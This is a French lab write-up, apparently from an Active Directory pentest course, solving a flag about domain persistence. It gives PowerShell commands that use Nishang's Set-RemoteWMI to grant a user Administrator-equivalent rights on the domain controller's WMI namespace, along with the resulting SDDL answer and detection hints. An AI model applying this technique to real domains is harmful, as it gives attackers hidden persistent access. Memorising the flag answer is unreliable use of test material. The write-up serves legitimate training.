---
flag: 22
machine: dcorp-dc
statut: à faire
technique: SDDL WMI
LO: "[[LO13 - Security descriptors et Silver]]"
---

# F22 · SDDL WMI root/cimv2 (studentx = BA)

> [!summary] Objectif
> Fournir la chaîne SDDL qui accorde à `studentx` les mêmes permissions que **BA** (Builtin\Administrators) sur le namespace WMI `root\cimv2` du DC — format `(A;CI;<Permissions>;;;<SID>)`.

## Contexte
- **Étape attack flow**: persistance post-DA (LO13) — modification de security descriptors pour retrouver un accès WMI/PSRemoting sans être DA.
- **Ce qu'on a**: DA effectif sur dcorp-dc (session/ticket), le script `Set-RemoteWMI.ps1` (Nishang) chargé.
- **Ce qu'on cherche**: la portion `<Permissions>` de l'ACE ajoutée par le script — les mêmes bits que ceux de `BA` sur `root\cimv2` — puis l'ACE complète avec le SID de studentx.

## Solution

### Étape 1 — Lire le SD actuel de root\cimv2 (repérer la ligne BA)
```powershell
$sd = Invoke-WmiMethod -Namespace root/cimv2 -Path "__systemsecurity=@" -Name GetSecurityDescriptor -ComputerName dcorp-dc
([wmiclass]"\\dcorp-dc\root\cimv2:Win32_SecurityDescriptorHelper").BinarySDToSDDL($sd.Descriptor).SDDL
```
→ Chercher l'ACE `(A;CI;<perms>;;;BA)` — repérer la valeur des `<perms>`.

### Étape 2 — Ajouter studentx avec les mêmes permissions (Nishang)
```powershell
. C:\AD\Tools\Set-RemoteWMI.ps1
Set-RemoteWMI -SamAccountName studentx -ComputerName dcorp-dc -Namespace 'root\cimv2' -Verbose
```
→ Voir [[Cheatsheet - Persistence]].

### Étape 3 — Vérifier l'ACE injectée dans le SDDL
```powershell
$sd = Invoke-WmiMethod -Namespace root/cimv2 -Path "__systemsecurity=@" -Name GetSecurityDescriptor -ComputerName dcorp-dc
([wmiclass]"\\dcorp-dc\root\cimv2:Win32_SecurityDescriptorHelper").BinarySDToSDDL($sd.Descriptor).SDDL
```

## Réponse

| Élément | Valeur |
|---------|--------|
| Permissions BA sur root\cimv2 | CCDCLCSWRPWPRCWD |
| ACE injectée pour studentx | `(A;CI;CCDCLCSWRPWPRCWD;;;<A REMPLIR DEPUIS LAB - SID studentx>)` |

> Rappel bits SDDL : `CC` CreateChild, `DC` DeleteChild, `LC` List, `SW` Self-Write, `RP` ReadProp, `WP` WriteProp, `RC` ReadControl, `WD` WriteDac. `CI` = Container-Inherit.

## Pièges et OPSEC
- Doit être exécuté depuis un contexte **DA** (accès au security descriptor du namespace WMI).
- Le SID exact de studentx dépend de l'instance de lab — récupérer via `Get-DomainUser studentx | select objectsid`.
- Certaines lignes du SDDL affichent `BA` alors que d'autres montrent un SID littéral — comparer sur les bits, pas sur la représentation textuelle.
- Après modification : accès WMI/PSRemoting **sans** être admin local — piste de détection **Event ID 4670** (Permissions changed) et modification de la clé `HKLM\Software\Microsoft\WBEM\CIMOM`.

## Refs
- [[Cheatsheet - Persistence]]
- [[Cheatsheet - ACL et droits AD]]
- [[LO13 - Security descriptors et Silver]]
- [[Synthèse - ACL et GPO]]

[[Flags - Index]] · [[Journal - Index]]
